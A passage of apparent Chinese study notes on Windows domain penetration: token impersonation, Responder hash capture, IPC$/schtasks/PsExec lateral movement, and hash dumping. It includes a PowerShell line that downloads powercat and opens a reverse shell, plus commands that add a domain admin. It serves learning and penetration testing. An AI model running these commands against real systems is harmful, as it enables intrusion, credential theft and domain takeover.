<h3 id="使用Rotten-Potato窃取令牌">使用Rotten Potato窃取令牌</h3>
<p>Rotten Potato 直译过来就烂土豆的意思，如果目标中存在有效的令牌，就可以通过 Rotten Potato 模拟用户令牌实现提权。</p>
<p>方法1：</p>
<p>Rotten PotatoNG 项目地址：<a target="_blank" rel="noopener" href="https://github.com/breenmachine/RottenPotatoNG">https://github.com/breenmachine/RottenPotatoNG</a></p>
<p>运行 RottenPotato.exe 直接弹出 SYSTEM 权限的 CMD 窗口，不需要用到 MSF。</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231111184146284.png" alt="image-20231111184146284"></p>
<p>方法2：</p>
<p>Rotten Potato项目地址：<a target="_blank" rel="noopener" href="https://github.com/foxglovesec/RottenPotato">https://github.com/foxglovesec/RottenPotato</a></p>
<pre class="line-numbers language-none"><code class="language-none"># 在攻击机上下载烂土豆
git clone https:&#x2F;&#x2F;github.com&#x2F;foxglovesec&#x2F;RottenPotato

# 回到Meterpreter Shell
# 加载模块
meterpreter &gt; use incognito
# 列出可用令牌
meterpreter &gt; list_tokens -u
# 上传烂土豆
meterpreter &gt; upload &#x2F;root&#x2F;RottenPotato&#x2F;rottenpotato.exe
# 执行
meterpreter &gt; execuce -HC -f rottenpotato.exe 
# 窃取token
meterpreter &gt; impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;
meterpreter &gt; getuid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="添加域管理员">添加域管理员</h3>
<p>假设网络中设置了域管理进程，在 <code>meterpreter</code> 会话窗口中输入<code>ps</code>命令，查看系统进程。找到域管理进程，并使用<code>migrate</code> 命令迁移到该进程。具体操作如下：</p>
<pre class="line-numbers language-none"><code class="language-none">#在 meterpreter 控制台中输入 shell ，进入命令行界面
meterpreter &gt; shell
# 查看进程，寻找域管理员的进程
ps
# 迁移进程
migrate &lt;域管理员进程&gt;

# 在域控主机上添加一个账户
# 添加域用户
net user test01 qqq@111 &#x2F;add &#x2F;domain
# 添加到管理员组
net group &quot;domain admins&quot; test01 &#x2F;add &#x2F;domain
# 查看域管理员
net group &quot;domain admins&quot; &#x2F;domain

# 还可以使用下面这种方法添加账户和添加到管理员组
add_user test01 qqq@111  -h 192.168.2.26
add_group_user &quot;Domain Admins&quot; test01 -h 192.168.2.26<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>对&quot;migrate &lt;域管理员进程&gt;&quot;的解读</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231111222409065.png" alt="image-20231111222409065"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231111222645765.png" alt="image-20231111222645765"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231111222656460.png" alt="image-20231111222656460"></p>
<h3 id="Empire下的令牌窃取">Empire下的令牌窃取</h3>
<p>在<code>Empire</code>下获取服务器权限后，可以使用内置的 <code>mimikatz</code> 工具获取系统密码。运行 <code>mimikatz</code>，输入<code>creds</code>命令，即可查看 <code>Empire</code> 列举出来的密码：</p>
<pre class="line-numbers language-none"><code class="language-none">usemodule privesc&#x2F;bypassuac
set Listener test
run
mimikatz
creds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231111223521885.png" alt="image-20231111223521885"></p>
<p>使用<code>pth &lt;ID&gt;</code>命令（这里的ID就是<code>creds</code> 下的<code> CredID</code> ），即可窃取身份令牌。</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231111230007225.png" alt="image-20231111230007225"></p>
<p>同样，得到了有token的进程的进程号，也可以使用<code>steal_token</code>窃取进程中的token，和使用ps找是一个道理。</p>
<h3 id="针对令牌窃取提权的防御分析">针对令牌窃取提权的防御分析</h3>
<p>针对令牌窃取提权的防御措施如下：</p>
<ul>
<li>及时安装微软推送的补丁。</li>
<li>对来路不明的或者有危险的软件，既不要在系统中使用，也不要在虚拟机中使用。</li>
<li>对令牌的时效性进行限制，以防止散列值被破解后泄露有效的令牌信息。越敏感的数据，其令牌时效应该越短。如果每个操作都使用独立的令牌，就可以比较容易地定位泄露令牌的操作或环节。</li>
<li>对于令牌，应采取加密存储及多重验证保护。</li>
<li>使用加密链路<code>SSL/TLS</code>传输令牌，以防止被中间人窃听。</li>
</ul>
<h2 id="无凭证条件下的权限">无凭证条件下的权限</h2>
<p>假设已经进入目标网络，但没有获得任何凭证，使用LLMNR 和 NetBIOS 欺骗攻击对目标网络进行渗透测试。</p>
<h3 id="LLMNR-和-NetBIOS-欺骗攻击的基本概念">LLMNR 和 NetBIOS 欺骗攻击的基本概念</h3>
<h4 id="LLMNR">LLMNR</h4>
<p>本地链路多播名称解析（LLMNR，全称Link-Local Multicast Name Resolution）是一种域名系统数据包格式。<mark>当局域网中的 DNS 服务器不可用时，DNS客户端会使用LLMNR解析本地网段中机器的名称，直到DNS服务器恢复正常为止。从 Windows Vista 开始支持 LLMNR ，Linux 系统也通过 systemd 实现了此协议，同时 LLMNR 也支持 IPv6</mark>。</p>
<p>LLMNR 的工作流程如下：</p>
<ol>
<li>DNS 客户端在自己的内部名称缓存中查询名称。</li>
<li>如果没有找到，主机将向主DNS发送名称查询请求。</li>
<li>如果主DNS没有回应或者收到了错误的信息，主机会向备DNS发送查询请求。</li>
<li>如果备DNS没有回应或者收到了错误的信息，将使用LLMNR进行解析。</li>
<li>主机通过 UDP 协议向组播地址 224.0.0.252 的 5355 端口发送多播查询请求，以获取主机名所对应的 IP 地址。查询范围仅限于本地子网。</li>
<li>本地子网中所有支持 LLMNR 的主机在收到查询请求后，会对比自己的主机名。如果不同，就丢弃；如果相同，就向查询主机发送包含自己 IP 地址的单播信息。</li>
</ol>
<h4 id="NetBIOS">NetBIOS</h4>
<p>NetBIOS是一种网络协议，一般用在由十几台计算机组成的局域网中（根据NetBIOS协议广播获得计算机名称，并将其解析为相应的 IP 地址）。<mark>在 Windows NT 以后版本的所有操作系统(对于Windows系统来说，一般指从 Windows 2000 开始的版本)中均可使用NetBIOS。但是，NetBIOS不支持IPv6</mark>。</p>
<p>NetBIOS提供的三种服务如下：</p>
<ul>
<li>NetBIOS-NS（名称服务）：主要用于名称注册和解析，以启动会话和分发数据报。该服务需要使用域名服务器来注册NetBIOS的名称。<mark>默认监听UDP 137端口，也可以使用TCP 137 端口</mark>。</li>
<li>Datagram Distribution Service（数据报分发服务）：无连接服务。该服务负责进行错误检测和恢复，<mark>默认监听 UDP 138 端口</mark>。</li>
<li>Session Service（会话服务）：允许两台计算机建立连接，允许电子邮件跨越多个数据包进行传输，提供错误检测和恢复机制。<mark>默认使用TCP 139端口</mark>。</li>
</ul>
<h4 id="Net-NTLM-Hash">Net-NTLM Hash</h4>
<blockquote>
<p>NTLM 即 NT LAN Manager，NTLM 是指 telnet 的一种验证身份方式，即问询/应答协议，是 Windows NT 早期版本的标准安全协议。</p>
</blockquote>
<p>Net-NTLM Hash 与NTLM Hash不同。</p>
<p><code>NTLM Hash</code>是指Windows操作系统的Security Account Manager 中保存的用户密码散列值（即<mark>Windows 登录密码的 Hash 值</mark>）。NTLM Hash通常保存在Windows的SAM文件或者NTDS.DIT数据库中，用于对访问资源的用户进行身份验证（即<mark>可以在 Windows 系统的 SAM 文件或者域控的 NTDS.dit 文件中提取到出来</mark>）。此外，<mark>NTLM Hash 支持哈希传递攻击</mark></p>
<p><code>Net-NTLM Hash </code>是指在网络环境中经过 NTLM 认证的散列值（即是<mark>网络环境下 NTLM 认证的 Hash</mark>）。挑战/响应验证中的“响应”就包含Net-NTLM Hash。<mark>使用Responder抓取的通常就是Net-NTLM Hash</mark>。攻击者无法使用该散列值进行哈希传递攻击，只能在使用Hashcat等工具得到明文后进行横向移动攻击（即<mark>该 Hash 不能进行哈希传递，但可用于 NTLM 中继攻击或者使用 Hashcat 等工具碰撞出明文进行横向</mark>）</p>
<h4 id="在LLMNR和NetBIOS共同作用下的名称解析步骤">在LLMNR和NetBIOS共同作用下的名称解析步骤</h4>
<ol>
<li>检查以确认请求是否针对本地计算机名称。</li>
<li>检查最近成功解析的名称的本地缓存。</li>
<li>搜索本地hosts文件当中解析。</li>
<li>查询 DNS 服务器，DNS没有回应或者收到了错误的信息。</li>
<li>如果启用了 LLMNR，则在本地子网中广播 LLMNR 查询以请求其对等方进行解析。</li>
<li>如果启用了 NetBIOS，如果名称不在本地 NetBIOS 缓存中，则尝试通过向本地子网广播 NetBIOS-NS 查询来解析 NetBIOS 名称。如果这样配置，此步骤可能会使用 Windows Internet 名称服务 (WINS) 服务器以及 LAN 管理器主机 (LMHOSTS) 文件</li>
</ol>
<h3 id="LLMNR和NetBIOS利用">LLMNR和NetBIOS利用</h3>
<p>上面说到，当目标网络的DNS服务器因发生故障而无法提供服务时，会退回LLMNR和NBT-NS进行计算机名解析。</p>
<p>Responder 是一款使用 Python 编写用于毒化 LLMNR 和 NBT-NS 请求的一款工具。Responder是监听LLMNR和NBT-NS协议的工具之一，能够抓取网络中所有的LLMNR和NBT-NS请求并进行响应，获取最初的账户凭证。Responder可以利用内置SMB认证服务器、MSSQL认证服务器、HTTP认证服务器、HTTPS认证服务器、LDAP 认证服务器、DNS服务器、WPAD 代理服务器，以及 FTP、POP3、IMAP、SMTP 等服务器，收集目标网络中计算机的凭据，还可以通过 Multi-Relay 功能在目标系统中执行命令。</p>
<p>Responder 项目地址：<a target="_blank" rel="noopener" href="https://github.com/lgandx/Responder">https://github.com/lgandx/Responder</a></p>
<p>Responder 不支持 Windows</p>
<p>进入目标网络后，如果没有获得任何目标系统的相关信息和重要凭证，可以开启 Responder 的监听模式</p>
<p>Responder 只会对网络中的流量进行分析，不会主动响应任何请求</p>
<pre class="line-numbers language-none"><code class="language-none">#Responder 开启监听，-I 指定网卡，这里 eth1 的 IP 为 192.168.7.65
python Responder.py -I eth1
#responder -I eth1  --lm -Pv<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231112103220352.png" alt="image-20231112103220352"></p>
<p>ON代表针对该服务数据包的监听，OFF代表关闭监听。由此可以分析出网络中存在的IP地址段、机器名等。</p>
<p>在使用 <code>Responder</code> 对网络进行分析之后，可以利用<code>SMB</code>协议获取目标网络中计算机的<code>Net-NTLM Hash</code>。如果用户输入了错误的计算机名，在<code>DNS</code>服务器上进行的名称查询操作将会失败，名称解析请求将被退回，使用<code>NBT-NS</code>和<code>LLMNR</code>进行解析，这个流程在上面已经反复提到</p>
<p><mark>在渗透测试中，使用Responder并启动回应请求功能，Responder会自动回应客户端的请求并声明自己就是被输入了错误计算机名的那台机器，然后尝试建立SMB连接。客户端会发送自己的 Net-NTLM Hash 进行身份验证，此时将得到目标机器的 Net-NTLM Hash</mark>（即开启监听后，当目标主机上有人访问 Responder 主机的共享目录时，就会看到对方的 Net-NTLM 哈希值）</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231112103030864.png" alt="image-20231112103030864"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231112103510036.png" alt="image-20231112103510036"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231112103518195.png" alt="image-20231112103518195"></p>
<p>保存凭据为hash.txt，使用hashcat进行爆破</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -m 5600 hash.txt password.txt -D 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231112103956778.png" alt="image-20231112103956778"></p>
<h1>域内横向移动</h1>
<p>域内横向移动技术是在复杂的内网攻击中被广泛使用的一种技术，尤其是在高级持续威胁 (<code>Advanced Persistent Threats</code>，<code>APT</code>）中。攻击者会利用该技术，以被攻陷的系统为跳板，访问其他域内主机，扩大资产范围（包括跳板机器中的文档和存储的凭证，以及通过跳板机器连接的数据库、域控制器或其他重要资产）。</p>
<p>通过此类攻击手段，攻击者最终可能获取域控制器的访问权限，甚至完全控制基于<code>Windows</code>操作系统的基础设施和与业务相关的关键账户。因此，必须使用强口令来保护特权用户不被用于横向移动攻击，从而避免域内其他机器沦陷。建议系统管理员定期修改密码，从而使攻击者获取的权限失效。</p>
<p>在渗透测试中，拿到目标计算机的用户明文密码或者 <code>NTLM Hash</code> 后，可以通过 <code>PTH</code>（<code>Pass the Hash</code>，凭据传递）的方法，将散列值或明文密码传送到目标机器中进行验证。与目标机器建立连接后，可以使用相关方法在远程 <code>Windows</code>操作系统中执行命令。在多层代理环境中进行渗透测试时，由于网络条件较差，无法使用图形化界面连接远程主机。此时，可以使用命令行的方式连接远程主机（最好使用 <code>Windows</code> 自带的方法对远程目标系统进行命令行下的连接操作）并执行相关命令。在实际的网络环境中，针对此类情况，网络管理员可以通过配置 <code>Windows</code> 系统自带的防火墙或组策略进行防御。</p>
<h2 id="IPC">IPC</h2>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231112120735911.png" alt="image-20231112120735911"></p>
<p>IPC 可以通过验证用户名和密码获得相应的权限，通常在远程管理计算机和查看计算机的共享资源时使用。通过 ipc$，可以与目标机器建立连接。利用这个连接，不仅可以访问目标机器中的文件，进行上传、下载等操作，还可以在目标机器上运行其他命令，以获取目标机器的目录结构、用户列表等信息。</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231112121106126.png" alt="image-20231112121106126"></p>
<p>可以简单理解为，<code>IPC$</code> 是用于访问远程计算机上命名管道的共享资源名称，IPC$就是命名管道 (Named Pipe)</p>
<p><mark>当目标开启了 IPC$ 文件共享并得到用户账号密码后，就可以使用 IPC 建立连接，获取权限</mark></p>
<pre class="line-numbers language-none"><code class="language-none">#建立 IPC 连接
net use \\192.168.7.107\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administrator
#查看当前的连接
net use<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231112121934173.png" alt="image-20231112121934173"></p>
<pre class="line-numbers language-none"><code class="language-none">#映射磁盘到本地
net use t: \\192.168.7.107\c$
#删除映射的磁盘
net use t: &#x2F;del &#x2F;y
#列出对方目录
dir \\192.168.7.107\c$
#下载文件到攻击机(本质是复制)
copy \\192.168.7.107\c$\1.bat 1.bat 
#写入文件到目标机器(本质也是复制)
copy C:\Users\Box\Desktop\calc.bat \\192.168.7.107\c$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231112122148679.png" alt="image-20231112122148679"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231112122121627.png" alt="image-20231112122121627"></p>
<pre class="line-numbers language-none"><code class="language-none">#tasklist 查看进程
tasklist &#x2F;S 192.168.7.107 &#x2F;U administrator &#x2F;P 1qaz@WSX<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231112122303262.png" alt="image-20231112122303262"></p>
<p>这里对tasklist列出的表头含义进行说明：</p>
<ul>
<li>
<p>会话名：一般有两种，分别是Console和Services。<img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231113112935420.png" alt="image-20231113112935420"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231113113015023.png" alt="image-20231113113015023"></p>
</li>
<li>
<p>会话#：一般有两种，分别0或1。这个表头表示进程所在的会话ID<img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231113113714530.png" alt="image-20231113113714530"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231113113736280.png" alt="image-20231113113736280"></p>
</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">#断开连接
net use \\192.168.7.107\ipc$ &#x2F;del<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="IPC利用条件">IPC利用条件</h3>
<ol>
<li>
<p>开启了139、445端口。ipc$可以实现远程登录及对默认共享资源的访问，而139端口的开启表示NetBIOS协议的应用。通过139、445(Windows2000)端口，可以实现对共享文件打印机的访问。因此，一般来讲，ipc连接需要139、445端口的支持</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231112144613490.png" alt="image-20231112144613490"></p>
</li>
<li>
<p>管理员开启了默认共享。默认共享是为了方便管理员进行远程管理而默认开启的，包括所有的逻辑盘(c$、d$、e$等和系统目录winnt或windows(admin$)通过ipc$，可以实现对这些默认共享目录的访问。<img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231112144900608.png" alt="image-20231112144900608"><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231112145148343.png" alt="image-20231112145148343"></p>
</li>
</ol>
<h3 id="IPC连接失败原因">IPC连接失败原因</h3>
<ul>
<li>用户名或密码错误。</li>
<li>目标没有打开 ipc$默认共享。</li>
<li>不能成功连接目标的139、445端口。</li>
<li>命令输入错误。</li>
</ul>
<h3 id="IPC连接常见错误">IPC连接常见错误</h3>
<ul>
<li>错误号5：拒绝访问。</li>
<li>错误号51：Windows 无法找到网络路径，即网络中存在问题。</li>
<li>错误号53：找不到网络路径，包括IP地址错误、目标未开机、目标的 lanmanserver服务未启动、目标有防火墙（端口过滤)。</li>
<li>错误号67：找不到网络名，包括 lanmanworkstation服务未启动、ipc$ 已被删除。</li>
<li>错误号1219：提供的凭据与已存在的凭据集冲突。例如，已经和目标建立了ipc$，需要在删除原连接后重新进行连接。</li>
<li>错误号1326：未知的用户名或错误的密码。</li>
<li>错误号1792：试图登录，但是网络登录服务器没有启动，包括目标NetLogon服务未启动（连接域控制器时会出现此情况)。</li>
<li>错误号2242：此用户的密码已过期。例如目标机器设置了账号管理策略，强制用户定期修改密码。</li>
</ul>
<h3 id="IPC配合系统服务横向移动">IPC配合系统服务横向移动</h3>
<p>在建立 IPC 连接后，可以配合系统服务实现横向移动</p>
<pre class="line-numbers language-none"><code class="language-none">#建立IPC连接
net use \\192.168.142.10\ipc$ &quot;密码&quot; &#x2F;user:账户
#上传恶意文件
copy C:\Users\Administrator\Desktop\can.exe \\192.168.142.10\c$\Users\Administrator\Desktop
#创建服务
sc \\192.168.142.10 create can binpath&#x3D; &quot;cmd.exe &#x2F;c C:\Users\Administrator\Desktop\can.exe&quot;
#开启服务
sc \\192.168.142.10 start can
#删除服务
sc \\192.168.142.10 delete can<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="计划任务">计划任务</h2>
<p>Windows 自带的可用于创建计划任务的命令有两个，分别是 at 和 schtasks，at 在 Windows Server 2008 及之后的系统中，已经被废弃了。</p>
<h3 id="at">at</h3>
<p>在建立 IPC 连接后，使用计划任务运行可执行文件，主要步骤如下：</p>
<ol>
<li>查看目标主机时间</li>
<li>上传可执行文件到目标主机</li>
<li>设置计划任务执行可执行文件</li>
<li>删除计划任务</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">#首先查看下目标主机时间
net time \\192.168.7.107<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231112154159000.png" alt="image-20231112154159000"></p>
<p>创建一个反弹木马 bat 程序，这里使用 PowerShell 进行反弹，bat 文件内容如下：</p>
<pre class="line-numbers language-none"><code class="language-none">powershell.exe -nop -w hidden -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;ghproxy.com&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;);powercat -c 192.168.7.4 -p 4444 -e cmd&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>在攻击机上开启 nc 监听</p>
<pre class="line-numbers language-none"><code class="language-none">nc -lvp 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>将 bat 程序上传到目标主机</p>
<pre class="line-numbers language-none"><code class="language-none">copy evil.bat \\192.168.7.107\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>使用 at 创建计划任务</p>
<pre class="line-numbers language-none"><code class="language-none">at \\192.168.7.107 14:30 C:\evil.bat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>可以使用at远程执行命令后，先将执行结果写入文本文件，再使用type命令远程读取该文本文件</p>
<pre class="line-numbers language-none"><code class="language-none">at \\1.1.1.10 4:10PM cmd.exe &#x2F;c &quot;ipconfig&quot; &gt; C:&#x2F;1.txt&quot;
type \\1.1.1.10\C$\1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>如果想清除 ID 为 1 的计划任务</p>
<pre class="line-numbers language-none"><code class="language-none">#计划任务不会随着它本身的执行而被删除，因此,网络管理员可以通过攻击者创建的计划任务获知网络遭受了攻击。
at \\192.168.7.107 1 &#x2F;del<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>查看所有的定时任务</p>
<pre class="line-numbers language-none"><code class="language-none">at<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231112160310441.png" alt="image-20231112160310441"></p>
<h3 id="schtasks">schtasks</h3>
<p>使用 schtasks 创建计划任务</p>
<pre class="line-numbers language-none"><code class="language-none"># 如果此前已经和目标机器建立了ipc$，那么在使用schtasks命令时不需要输入密码。
# 如果没有建立ipc$，可以在执行schtasks命令时使用 &#x2F;u 和 &#x2F;p 参数指定用户名和密码
# 开机以 system 权限执行 C:\evil.bat
schtasks &#x2F;create &#x2F;s 192.168.7.107 &#x2F;tn evil &#x2F;sc onstart &#x2F;tr C:\evil.bat &#x2F;ru system &#x2F;f

# 在 2021&#x2F;08&#x2F;03 前的每一天的 14:30:00 执行 C:\evil.bat
schtasks &#x2F;create &#x2F;s 192.168.7.107 &#x2F;tn evil &#x2F;tr C:\evil.bat &#x2F;sc daily &#x2F;st 14:30:00 &#x2F;ed 2021&#x2F;08&#x2F;03

# 运行名称为 evil 的任务
schtasks &#x2F;run &#x2F;s 192.168.7.107 &#x2F;i &#x2F;tn &quot;evil&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>清除名称为 evil 的计划任务</p>
<pre class="line-numbers language-none"><code class="language-none">schtasks &#x2F;delete &#x2F;s 192.168.7.107 &#x2F;tn &quot;evil&quot; &#x2F;f
#schtasks &#x2F;delete &#x2F;u administrator &#x2F;p admin@123 &#x2F;s 192.168.7.107 &#x2F;tn &quot;evil&quot; &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>查看所有的定时任务</p>
<pre class="line-numbers language-none"><code class="language-none">schtasks<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231112160652562.png" alt="image-20231112160652562"></p>
<p><mark>在使用schtasks命令时，会在系统中留下日志文件C:\Windows\Tasks\SchedLgU.txt</mark>。如果执行schtasks命令后没有回显，可以配合ipc$使用type命令远程查看执行结果</p>
<p>在建立 IPC 连接后，除了使用计划任务进行间接的反弹 Shell，还可以通过 PsExec 直接反弹 Shell</p>
<p>PsExec 下载地址：<a target="_blank" rel="noopener" href="https://download.sysinternals.com/files/PSTools.zip">https://download.sysinternals.com/files/PSTools.zip</a></p>
<pre class="line-numbers language-none"><code class="language-none">Psexec.exe -accepteula \\192.168.7.107 -s cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231112164409426.png" alt="image-20231112164409426"></p>
<h2 id="Windows系统散列值-哈希-获取">Windows系统散列值(哈希)获取</h2>
<p>Windowus 操作系统通常使用两种方法对用户的明文密码进行加密处理。<mark>在域环境中，用户信息存储在ntds.dit文件中，加密后为散列值，该文件位于 %SystemRoot%\ntds\ntds.dit 路径下，由于该文件一直被活动目录访问，因此这个文件是被系统禁止读取的。在非域环境中，即工作组的环境中，用户的密码等信息被存储在 SAM 文件中，该文件也同样是被系统禁止读取的</mark>。</p>
<p>Windows 系统中的密码一般由两部分组成，分别是 LM Hash 和 NTLM Hash，结构通常如下：</p>
<pre class="line-numbers language-none"><code class="language-none">username:RID:LM-Hash:NT-Hash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>LM Hash的全名为“LAN Manager Hash“，是微软为了提高Windows操作系统的安全性而采用的散列加密算法，其本质是DES加密，尽管LM Hash比较容易被破解，但是为了保证系统的兼容性，Windows只是将LM Hash禁用了(<mark>从Windows svista和Windows server 2008版本开始，Windows默认禁用LM Hash</mark>)。LM hash明文密码被限定在14位以内，也就是说，如果要停止使用LMHash，将用户的密码设置至14位以上即可，<mark>如果LMHash被禁用了，攻击者通过工具抓取的LMHash通常为“aad3b435b51404eeaad3b435b51404ee“(表示LMHash为空值或被禁用)</mark></p>
<p>NTLM Hash是微软为了在提高安全性的同时保证兼容性而设计的散列加密算法，NTLM Hash是基于MD4加密算法进行加密的。<mark>个人版从Windows Vista以后，服务器版从Wndows Sever 2003以后，Windows 操作系统的认证方式均为NTLM Hash</mark>。</p>
<p>在 Windows Vista 和 Windows Server 2003 及之前的系统默认使用的是 LM 加密，只有用户密码超过 14 位时才会使用 NTLM 加密，之后从 Vista 的系统开始，不再使用 LM Hash 加密，而是全部采用了 NTLM Hash 加密。</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231112183445774.png" alt="image-20231112183445774"></p>
<p><mark>要想在Windows操作系统中抓取散列值或明文密码，必须将权限提升至System。本地用户名、散列值和其他安全验证信息都保存在SAM文件中</mark>。Isass.exe进程用于实现Windows的安全策略(本地安全策略和登录策略)。可以使用工具将散列值和明文密码从内存中的Isass.exe进程或SAM文件中导出。</p>
<p><mark>在Windows操作系统中，SAM文件的保存位置是C:\Windows\System32\config\SAM。该文件是被锁定的，不允许复制</mark>。在渗透测试中，可以采用传统方法，在关闭Windows操作系统之后，使用PE盘进入文件管理环境，直接复制SAM文件，也可以使用VSS等方法进行复制。</p>
<p>常见的抓取密码的工具：</p>
<ul>
